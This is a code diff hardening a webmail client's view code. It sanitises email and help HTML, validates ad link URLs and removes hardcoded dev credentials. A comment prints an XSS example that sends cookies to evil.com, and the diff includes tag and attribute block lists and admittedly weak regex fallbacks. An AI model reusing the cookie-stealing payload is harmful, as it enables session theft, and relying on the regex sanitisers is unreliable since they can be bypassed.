@@ -1243,7 +1243,24 @@ magma.view = (function() {
 
             // show page when topic clicked
             helpModel.addObserver('updatePage', function(page) {
-                self.page.empty().html(page);
+                // SECURITY FIX (V-003): Sanitize help page content before rendering.
+                // Even though help content is typically from a trusted source, defense-in-depth
+                // protects against compromised servers, XSS via stored content, or man-in-the-middle attacks.
+                // If DOMPurify is available, use it; otherwise use basic sanitization.
+                var sanitizedPage = page;
+                if (typeof DOMPurify !== 'undefined') {
+                    sanitizedPage = DOMPurify.sanitize(page, {
+                        USE_PROFILES: {html: true},
+                        FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form', 'input'],
+                        FORBID_ATTR: ['onerror', 'onclick', 'onload', 'onmouseover', 'onfocus', 'onblur']
+                    });
+                } else {
+                    // Basic sanitization fallback: strip script tags and event handlers
+                    // This is not as robust as DOMPurify but provides some protection
+                    sanitizedPage = page.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
+                                        .replace(/\s*on\w+\s*=\s*(['"])[^'"]*\1/gi, '');
+                }
+                self.page.empty().html(sanitizedPage);
             });
 
             self = {
@@ -1286,9 +1303,14 @@ magma.view = (function() {
             authModel.addObserver('success', gotoLoading);
             authModel.addObserver('locked', gotoLocked);
             
-            // [DEV]
-            username.val('magma');
-            password.val('password');
+            // SECURITY FIX (V-009): Removed hardcoded default credentials.
+            // Hardcoded credentials in source code pose a security risk as they
+            // can be discovered through source code review and used for unauthorized access.
+            // If test credentials are needed for development, use environment variables
+            // or a separate development configuration file that is not committed to version control.
+            // [DEV] - REMOVED FOR SECURITY
+            // username.val('magma');
+            // password.val('password');
             // [/DEV]
 
             // handle login submit
@@ -1641,8 +1663,39 @@ magma.view = (function() {
 
             adWarning: function(adModel) {
                 // add continue link with filled in href
-                var container = getBlock('loadingWarning')
-                    .append('<a id="continue" class="button" target="_blank" href="' + adModel.getAdHref() + '">Continue</a>');
+                var container = getBlock('loadingWarning');
+
+                // SECURITY FIX (V-004): Validate ad URLs before inserting into DOM.
+                // Previously, href was concatenated directly into HTML which allowed
+                // javascript: protocol attacks (e.g., javascript:alert(document.cookie))
+                // and other malicious URL schemes to execute code when clicked.
+                var adHref = adModel.getAdHref();
+
+                // Validate URL protocol - only allow http and https to prevent
+                // javascript:, data:, and other dangerous URI schemes
+                var isValidUrl = (function(url) {
+                    try {
+                        var parsed = new URL(url, window.location.origin);
+                        return parsed.protocol === 'http:' || parsed.protocol === 'https:';
+                    } catch (e) {
+                        return false;
+                    }
+                })(adHref);
+
+                if (isValidUrl) {
+                    // Create link element safely using jQuery attr() method
+                    // attr() properly escapes the attribute value
+                    var link = $('<a id="continue" class="button" target="_blank">Continue</a>');
+                    link.attr('href', adHref);
+                    container.append(link);
+                } else {
+                    // Log invalid URL and don't render the potentially malicious link
+                    if (window.console && console.warn) {
+                        console.warn('Security: Invalid ad URL blocked:', adHref);
+                    }
+                    // Still show container but without the link
+                    container.append('<span id="continue" class="button disabled">Continue</span>');
+                }
 
                 var showWarning = function() {
                     container
@@ -1780,7 +1833,62 @@ magma.view = (function() {
                         body.appendTo(container);
                     });
 
-                    tmplModel.fillTmpl('messageBody', messageModel.getSection('body'));
+                    // SECURITY FIX (V-001): Sanitize email body HTML before rendering.
+                    // This is a CRITICAL security fix. Email bodies can contain malicious
+                    // JavaScript that would execute in the user's browser context when
+                    // the {{html html}} template directive renders the content.
+                    // Attack example: An attacker sends an email containing:
+                    //   <script>document.location='https://evil.com?c='+document.cookie</script>
+                    // Without sanitization, this would steal the user's session.
+                    var bodyData = messageModel.getSection('body');
+                    if (bodyData && bodyData.html) {
+                        if (typeof DOMPurify !== 'undefined') {
+                            // Use DOMPurify for robust HTML sanitization
+                            // This removes dangerous elements while preserving safe email formatting
+                            bodyData.html = DOMPurify.sanitize(bodyData.html, {
+                                // Allow common email formatting tags
+                                ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'u', 'strong', 'em', 'a', 'ul', 'ol', 'li',
+                                              'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote', 'pre', 'code',
+                                              'table', 'thead', 'tbody', 'tr', 'td', 'th', 'img', 'div', 'span',
+                                              'font', 'hr', 'sub', 'sup', 'center', 'small', 'big', 's', 'strike'],
+                                // Allow safe attributes only - no event handlers
+                                ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'style', 'class', 'id',
+                                              'width', 'height', 'border', 'cellpadding', 'cellspacing',
+                                              'align', 'valign', 'color', 'size', 'face', 'bgcolor', 'target'],
+                                // Block dangerous URI schemes (javascript:, data:, vbscript:, etc.)
+                                ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
+                                // Explicitly forbid dangerous elements and attributes
+                                FORBID_TAGS: ['script', 'style', 'iframe', 'frame', 'frameset', 'object',
+                                             'embed', 'applet', 'form', 'input', 'button', 'select', 'textarea',
+                                             'base', 'meta', 'link', 'svg', 'math'],
+                                FORBID_ATTR: ['onerror', 'onclick', 'onload', 'onmouseover', 'onfocus',
+                                             'onblur', 'onmouseout', 'onkeydown', 'onkeyup', 'onkeypress',
+                                             'onsubmit', 'onreset', 'onchange', 'oninput', 'ondrag', 'ondrop']
+                            });
+                        } else {
+                            // Fallback sanitization if DOMPurify is not available
+                            // IMPORTANT: This is a basic fallback - DOMPurify should be included for production
+                            console.warn('Security: DOMPurify not available, using basic sanitization for email body');
+                            bodyData.html = bodyData.html
+                                // Remove script tags and their content
+                                .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
+                                // Remove style tags and their content
+                                .replace(/<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>/gi, '')
+                                // Remove iframe, frame, object, embed tags
+                                .replace(/<(iframe|frame|object|embed|applet)\b[^>]*>[\s\S]*?<\/\1>/gi, '')
+                                .replace(/<(iframe|frame|object|embed|applet)\b[^>]*\/?>/gi, '')
+                                // Remove event handlers (onclick, onerror, etc.)
+                                .replace(/\s*on\w+\s*=\s*(['"])[^'"]*\1/gi, '')
+                                .replace(/\s*on\w+\s*=\s*[^\s>]*/gi, '')
+                                // Remove javascript: and data: URLs
+                                .replace(/href\s*=\s*(['"])?\s*javascript:[^'">]*/gi, 'href="#blocked"')
+                                .replace(/src\s*=\s*(['"])?\s*javascript:[^'">]*/gi, 'src="#blocked"')
+                                .replace(/href\s*=\s*(['"])?\s*data:[^'">]*/gi, 'href="#blocked"')
+                                .replace(/src\s*=\s*(['"])?\s*data:[^'">]*/gi, 'src="#blocked"');
+                        }
+                    }
+
+                    tmplModel.fillTmpl('messageBody', bodyData);
                 });
 
                 return {
